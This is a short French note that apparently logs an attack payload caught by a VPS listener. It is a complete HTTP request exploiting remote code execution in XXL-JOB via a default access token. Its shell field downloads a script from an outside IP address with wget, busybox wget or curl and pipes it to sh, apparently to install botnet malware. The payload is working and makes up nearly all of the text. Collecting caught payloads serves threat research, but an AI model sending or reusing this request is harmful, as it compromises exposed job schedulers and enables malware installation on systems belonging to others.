# HISTORIQUE VPS

Payloads sympathiques reçus sur des listeners et gardés de côté au cas où.

## 11/05/2026 : XXL-JOB

Payload pour exploiter une RCE sur XXL-JOB :

```
POST /run HTTP/1.1
Host: XXX:9999
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Connection: close
Accept: */*
XXL-JOB-ACCESS-TOKEN: default_token
Content-Type: application/json
Content-Length: 441

{"jobId":1,"executorHandler":"demoJobHandler","executorParams":"demoJobHandler","executorBlockStrategy":"COVER_EARLY","executorTimeout":3600,"logId":1,"logDateTime":1586629003729,"glueType":"GLUE_SHELL","glueSource":"(wget -qO- http://204.10.194.134/rondo.``kwm.sh||busybox wget -qO- http://204.10.194.134/rondo.``kwm.sh||curl -s http://204.10.194.134/rondo.``kwm.sh)|sh","glueUpdatetime":1586629003727,"broadcastIndex":0,"broadcastTotal":0}
```

